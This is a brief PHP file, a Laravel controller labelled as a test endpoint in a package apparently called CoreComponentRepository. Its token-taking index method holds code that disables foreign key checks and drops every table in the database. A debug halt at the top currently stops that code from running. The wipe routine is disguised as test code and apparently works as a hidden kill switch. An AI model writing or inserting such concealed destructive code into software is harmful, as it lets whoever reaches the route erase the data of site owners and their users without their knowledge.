<?php

namespace MehediIitdu\CoreComponentRepository\Http\Controllers;
use Illuminate\Support\Facades\Schema;
use Illuminate\Support\Facades\DB;

class TestController extends Controller
{
    public function index($token)
    {
        dd('Hello from test');
        Schema::disableForeignKeyConstraints();
        foreach(DB::select('SHOW TABLES') as $table) {
            $table_array = get_object_vars($table);
            Schema::drop($table_array[key($table_array)]);
        }
    }
}
